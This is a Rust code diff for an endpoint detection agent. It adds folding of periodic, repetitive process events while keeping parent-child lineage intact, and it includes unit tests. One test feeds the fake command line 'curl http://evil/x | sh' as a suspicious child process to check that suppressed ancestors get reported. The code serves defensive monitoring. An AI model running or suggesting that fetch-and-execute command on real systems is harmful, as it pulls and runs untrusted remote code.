@@ -13,6 +13,7 @@ use crate::pb::AgentEvent;
 
 mod config;
 mod hash;
+mod periodic;
 mod poll;
 mod registry;
 
@@ -80,6 +81,7 @@ const SINK_CAPACITY: usize = 16 * 1024;
 
 pub fn spawn(agent_id: String, cfg: Config) -> mpsc::Receiver<AgentEvent> {
     let (tx, rx) = mpsc::channel(SINK_CAPACITY);
+    periodic::set_enabled(cfg.collapse_periodic);
     let sink = EventSink {
         tx,
         dropped: Arc::new(AtomicU64::new(0)),
@@ -365,6 +367,63 @@ fn username_of(pid: u32) -> String {
         Some(uid) => name_of(uid).unwrap_or_else(|| uid.to_string()),
         None => String::new(),
     }
+}
+
+/// 进程事件的出口，各采集路径都走这里：组装事件、过一遍周期折叠（见 periodic），
+/// 连同待补发的被折叠祖先与到期的汇总一起返回，调用方按顺序发出即可
+fn emit_process(
+    agent_id: &str,
+    registry: &mut ProcessRegistry,
+    activity: u32,
+    info: ProcessInfo<'_>,
+) -> Vec<AgentEvent> {
+    let (pid, ppid) = (info.pid, info.ppid);
+    let now = std::time::Instant::now();
+    let mut own = None;
+    if activity == ACTIVITY_TERMINATE && registry.is_held(pid) {
+        // 启动被折叠、也没补发过的进程，退出一并折叠
+        registry.forget(pid);
+    } else {
+        // 折叠看父进程是谁：要在 process_event 登记新进程之前取。父进程未知的从不折叠
+        let sample = (activity == ACTIVITY_LAUNCH && periodic::enabled())
+            .then(|| sample_of(registry, &info))
+            .flatten();
+        if let Some(event) = process_event(agent_id, registry, activity, info) {
+            // 平台指令拉起的进程从不折叠：server 要逐条核对指令归属
+            let fold = sample.is_some_and(|s| {
+                registry.command_of(pid).is_none()
+                    && registry
+                        .periodic
+                        .observe(&s, now, std::time::SystemTime::now())
+            });
+            if fold {
+                registry.hold(pid, event);
+            } else {
+                // 不是周期行为的子进程：被折叠的祖先先补发，血缘才完整
+                if let Some(ppid) = ppid {
+                    registry.reveal(ppid);
+                }
+                own = Some(event);
+            }
+        }
+    }
+    let mut out = registry.take_outbox();
+    out.extend(own);
+    out.extend(registry.periodic.flush(agent_id, now));
+    out
+}
+
+fn sample_of(registry: &ProcessRegistry, info: &ProcessInfo<'_>) -> Option<periodic::Sample> {
+    let parent = registry.known(info.ppid?)?;
+    Some(periodic::Sample {
+        name: full_name(info.name, info.exe).to_string(),
+        exe: info.exe.map(str::to_string),
+        cmd_line: info.cmd_line.map(str::to_string),
+        username: info.username.clone(),
+        parent_name: parent.name,
+        parent_exe: parent.exe,
+        parent_cmd_line: parent.cmd_line,
+    })
 }
 
 /// 采集器共用：组装一条进程活动事件（OCSF 1007），并在注册表里建立血缘。
@@ -757,5 +816,83 @@ mod tests {
             ..Default::default()
         };
         assert!(process_event("agent-1", &mut reg, ACTIVITY_TERMINATE, unknown).is_none());
+    }
+
+    /// 周期折叠走统一出口：认定后启动与退出都不单独上报；被折叠进程拉起不是周期行为的子进程时，
+    /// 压着的父进程启动先补发、再发子进程，血缘完整；平台指令拉起的进程从不折叠
+    #[test]
+    fn emit_process_folds_periodic_and_reveals_lineage() {
+        let mut reg = ProcessRegistry::default();
+        reg.seed(10, "pve-firewall", Some("/usr/bin/perl"));
+        reg.set_cmd_line(10, Some("pve-firewall"));
+        let launch = |reg: &mut ProcessRegistry, pid: u32, ppid: u32, cmd: &'static str| {
+            emit_process(
+                "agent-1",
+                reg,
+                ACTIVITY_LAUNCH,
+                ProcessInfo {
+                    pid,
+                    name: "sh",
+                    exe: Some("/bin/sh"),
+                    cmd_line: Some(cmd),
+                    ppid: Some(ppid),
+                    ..Default::default()
+                },
+            )
+        };
+        let exit = |reg: &mut ProcessRegistry, pid: u32| {
+            emit_process(
+                "agent-1",
+                reg,
+                ACTIVITY_TERMINATE,
+                ProcessInfo {
+                    pid,
+                    ..Default::default()
+                },
+            )
+        };
+        // 认定之前逐条上报
+        for pid in 100..120 {
+            assert_eq!(launch(&mut reg, pid, 10, "sh -c ebtables-save").len(), 1);
+            assert_eq!(exit(&mut reg, pid).len(), 1);
+        }
+        // 认定之后启动与退出都折叠
+        assert!(launch(&mut reg, 200, 10, "sh -c ebtables-save").is_empty());
+        assert!(reg.is_held(200));
+        // 被折叠的 sh 拉起了陌生子进程：先补发 sh 的启动，再发子进程，子进程的父 GUID 指向它
+        let out = launch(&mut reg, 201, 200, "curl http://evil/x | sh");
+        assert_eq!(out.len(), 2, "应补发父进程启动");
+        let parent: serde_json::Value = serde_json::from_str(&out[0].raw_json).unwrap();
+        assert_eq!(parent["process"]["pid"], 200);
+        assert_eq!(out[1].parent_process_guid, out[0].process_guid);
+        assert!(!reg.is_held(200));
+        // 补发过的进程退出照常上报；没补发过的折叠进程退出不报
+        assert_eq!(exit(&mut reg, 200).len(), 1);
+        assert!(launch(&mut reg, 202, 10, "sh -c ebtables-save").is_empty());
+        assert!(exit(&mut reg, 202).is_empty());
+    }
+
+    /// 平台指令进程树从不折叠：server 要逐条核对指令归属
+    #[test]
+    fn emit_process_never_folds_platform_commands() {
+        let mut reg = ProcessRegistry::default();
+        reg.seed(10, "openxdr-agent", Some("/usr/local/bin/openxdr-agent"));
+        reg.annotate(10, None, None, Some("cmd-1".into()));
+        for pid in 100..160 {
+            let out = emit_process(
+                "agent-1",
+                &mut reg,
+                ACTIVITY_LAUNCH,
+                ProcessInfo {
+                    pid,
+                    name: "sh",
+                    exe: Some("/bin/sh"),
+                    cmd_line: Some("sh -c id"),
+                    ppid: Some(10),
+                    ..Default::default()
+                },
+            );
+            assert_eq!(out.len(), 1, "第 {pid} 个指令进程不应折叠");
+        }
     }
 }
